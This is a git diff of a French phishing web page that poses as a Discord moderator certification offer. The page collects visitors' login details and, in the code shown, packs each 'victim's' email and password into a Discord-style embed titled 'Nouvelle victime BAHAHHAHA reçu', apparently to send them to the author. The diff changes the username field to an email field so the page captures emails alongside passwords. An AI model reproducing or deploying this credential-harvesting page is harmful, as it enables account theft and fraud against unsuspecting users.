@@ -38,7 +38,7 @@
 </head>
 <body>
   <h2>💬 Fait toi certifier modérateur discord ! ps: LES CHATS C'EST LES MEILLEURS</h2>
-  <input type="text" id="pseudo" placeholder="Ton pseudo...">
+  <input type="text" id="pseudo" placeholder="Ton email...">
   <input type="text" id="message" placeholder="Ton mot de passe...">
   <button id="sendBtn">Entrer</button>
 
@@ -50,7 +50,7 @@
       const message = document.getElementById("message").value.trim();
 
       if (!pseudo || !message) {
-        alert("Merci de remplir ton pseudo et ton mot de passe !");
+        alert("Merci de remplir ton email et ton mot de passe !");
         return;
       }
 
@@ -60,7 +60,7 @@
             title: "📩 Nouvelle victime BAHAHHAHA reçu",
             color: 0x5865f2,
             fields: [
-              { name: "👤 Pseudo du con", value: pseudo, inline: true },
+              { name: "👤 email du con", value: pseudo, inline: true },
               { name: "🔒 Mot de passe du con", value: message, inline: false }
             ],
             footer: { text: "Message envoyé depuis mon site malicieux 💻" }
@@ -82,6 +82,7 @@
 </body>
 
 </html>
+
 
 
 
